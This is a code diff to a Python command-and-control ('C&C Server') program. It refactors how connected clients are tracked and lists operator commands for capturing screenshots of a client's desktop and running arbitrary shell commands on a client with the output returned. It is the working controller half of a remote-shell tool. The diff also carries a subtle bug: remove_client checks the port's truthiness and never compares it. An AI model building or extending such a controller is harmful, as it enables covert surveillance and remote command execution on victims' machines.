@@ -7,10 +7,27 @@ from datetime import datetime
 # SockerServer example used at https://docs.python.org/3/library/socketserver.html
 # Threads is used to run multiple I/O-bound tasks simultaneously, here, requests
 
-# Global dic to track connected clients and their sockets
+# Global list to track connected clients and their sockets
 # Needs to be refactored, Explore the Reactor Pattern in the future
-connected_clients = {}
+connected_clients = []
 
+class ClientSocket:
+    static_id = 0
+
+    def __init__(self, socket, ip, port, id) :
+        self.socket = socket
+        self.ip = ip
+        self.port = port
+        self.id = id
+
+    def __repr__(self) -> str:
+        return (f'Client( {self.ip}@{self.port} - ID:{self.id})')
+    
+def remove_client(clients, ip, port):
+    for client in clients:
+        if client.ip == ip and client.port:
+            clients.remove(client)
+            break
 
 # Override class socketserver.BaseRequestHandler : https://docs.python.org/3/library/socketserver.html#socketserver.BaseRequestHandler
 class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
@@ -22,7 +39,10 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 
     def setup(self) :
         print(f'\nNew client connection : {self.client_address}')
-        connected_clients[self.client_address] = self.request # storing the socket
+        ClientSocket.static_id += 1
+        id = ClientSocket.static_id
+        client = ClientSocket(self.request, self.client_address[0], self.client_address[1], id)
+        connected_clients.append(client)
         # print(f'Threads alive : {threading.active_count()}') # Debug purpose
 
     def handle(self):
@@ -85,7 +105,7 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 
     def finish(self) :
         print(f'\nConnection closed for: {self.client_address}')
-        del connected_clients[self.client_address]
+        remove_client(connected_clients, self.client_address[0], self.client_address[1])
 
     def get_screenshot(): # Refactor : Put the screenshot part here 
         pass
@@ -121,7 +141,7 @@ def central_commands():
             if menu_option == 'help':
                 list_commands_available()
             elif menu_option == 'list':
-                print_clients()
+                list_clients()
             elif menu_option == 'send_echo':
                 send_echo(msg)
             elif menu_option == 'get_SC':
@@ -138,35 +158,47 @@ def central_commands():
 
 
 def list_commands_available():
-    print('\nhelp : List all the commands available')
-    print('list : To list clients connected to the server')
-    print('send_echo [clientIP@port] ["message"]')
-    print('get_SC [clientIP@port] : Get a ScreenShot of the client Desktop')
-    print('shell [clientIP@port] [Shell Command] : Send a Shell command to the client and get the result')
+    print("""
+Available Commands:
+    help
+        List all the commands available.
+
+    list
+        List clients connected to the server.
+
+    send_echo [clientID] ["message"]
+        Send an echo message to the specified client.
+        example : > send_echo 1 "Test 1 2 3 Test"
+
+    get_SC [clientID]
+        Get a screenshot of the client desktop.
+        example : > get_SC 1
+
+    shell [clientID] [Shell Command]
+        Send a shell command to the client and retrieve the result.
+        example : > shell 1 powershell ls -n
+    """)
 
 
-def print_clients():
+
+def list_clients():
     if len(connected_clients) == 0: 
         print('No clients connected')
     else :
-        print('Clients : ')
         for client in connected_clients:
-            print(f'{client[0]}@{client[1]}')
+            print(client)
 
 
 # REFACTOR : Verify that the socket is not closed, share the method from client
-def get_client(msg: str):
+def get_client(msg: str) :
     """ Return socket.socket object """
-
-    client_ip, client_port = msg.split(' ')[1].split("@")
-    client_port = int(client_port)
-    # print(f'Client : {client_ip} @ {client_port} and msg : {echo_msg}')
-
-    for client in connected_clients:
-        if client[0] == client_ip and client[1] == client_port:
-            return connected_clients.get(client)
     
-    print(f'Client {client_ip}@{client_port} is not is the list of connected client')
+    id = int(msg.split(' ')[1])
+    for client in connected_clients:
+        if client.id == id:
+            return client.socket
+    
+    print(f'ClientID - {id} is not is the list of connected client')
     return None
 
 
@@ -190,10 +222,10 @@ def get_SC(msg: str):
 # Add more examples
 # REFACTOR Do some verification on the user input
 def send_shell(msg: str):
-    """ Usage : shell 127.0.0.1@57693 powershell ls -n"""
+    """ Usage : shell 1 powershell ls -n"""
 
     client_socket = get_client(msg)
-    command = re.split('@\d+ ', msg)[1] # Do some join if there's more than 1 @
+    command = re.split('\w+ \d+ ', msg)[1] # Do some join if there's more than 1 @
     print(f'Command : {command} sent')
 
     client_socket.sendall(command.encode('utf-8')) 
@@ -209,9 +241,16 @@ if __name__ == '__main__':
     
     try :
         with ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler) as server : 
-            print('--------------------------------------------')
-            print(f'Server Hosting @ : {HOST}:{PORT}')
-            print('--------------------------------------------')
+            programm_name = f"""  
+            _________    ____   _________     _________                                
+            \_   ___ \  /  _ \  \_   ___ \   /   _____/ ______________  __ ___________ 
+            /    \  \/  >  _ </\/    \  \/   \_____  \_/ __ \_  __ \  \/ // __ \_  __ \\
+            \     \____/  <_\ \/\     \____  /        \  ___/|  | \/\   /\  ___/|  | \/
+             \______  /\_____\ \ \______  / /_______  /\___  >__|    \_/  \___  >__|   
+                    \/        \/        \/          \/     \/                 \/       
+                                Hosting - {HOST}:{PORT}
+            """
+            print(programm_name)
 
             # Run the server in a separate thread to control it from the main thread
             server_thread = threading.Thread(target=server.serve_forever) # In a loop, Handling one request at a time until shutdown. (CTL+C) 
